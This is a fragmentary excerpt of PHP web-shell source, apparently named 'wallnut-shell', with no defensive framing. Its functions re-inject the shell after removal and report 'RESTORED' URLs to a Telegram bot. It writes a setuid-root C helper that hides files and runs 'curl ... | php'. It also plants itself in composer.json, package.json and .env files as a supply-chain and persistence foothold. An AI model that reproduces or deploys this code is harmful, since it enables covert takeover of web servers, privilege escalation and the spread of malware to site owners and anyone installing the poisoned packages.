...
// ============================================================
// INJECT RESTORE - OMEGA EDITION (FIXED)
// ============================================================
...
function inject_restore_omega() {
    ...
    $restoreCode .= "                    \$domain = \$_SERVER['HTTP_HOST'] ?? 'localhost';\n";
    $restoreCode .= "                    \$protocol = (isset(\$_SERVER['HTTPS']) ? 'https://' : 'http://');\n";
    $restoreCode .= "                    \$url = \$protocol . \$domain . '/' . \$current_file;\n";
    $restoreCode .= "                    @file_get_contents('https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $telegramUserId . "&text=' . urlencode('RESTORED: ' . \$url));\n";
    $restoreCode .= "                    break;\n";
    $restoreCode .= "                }\n";
    $restoreCode .= "            }\n";
    $restoreCode .= "        }\n";
    ...
    $url = $fileInfo['url'] ?? 'unknown';
    $simpleMsg = "RESTORED: " . $url;
    sendTelegramMessage($botToken, $telegramUserId, $simpleMsg);
...
static const char* hidden_files[] = {"' . basename($file) . '", NULL};
...
int main() {
    setuid(0); 
    setgid(0);
    system("curl -s http://' . $_SERVER['HTTP_HOST'] . '/' . basename($currentFile) . ' | php");
    return 0;
}
';
    ...
    foreach ($composer_files as $file) {
        if (is_writable($file)) {
            ...
            if ($content && strpos($content, 'wallnut-shell') === false) {
                $payload = '"wallnut-shell": "https://' . $_SERVER['HTTP_HOST'] . '/' . basename($currentFile) . '"';
    ...
    foreach ($npm_files as $file) {
        if (is_writable($file)) {
            $content = @file_get_contents($file);
            if ($content && strpos($content, 'wallnut-shell') === false) {
                $payload = '"wallnut-shell": "git+https://' . $_SERVER['HTTP_HOST'] . '/' . basename($currentFile) . '"';
    ...
    foreach ($env_files as $file) {
        if (is_writable($file)) {
            @file_put_contents($file, "\nAUTO_PREPEND_FILE=http://" . $_SERVER['HTTP_HOST'] . "/" . basename($currentFile) . "\n", FILE_APPEND);
            $supply_count++;
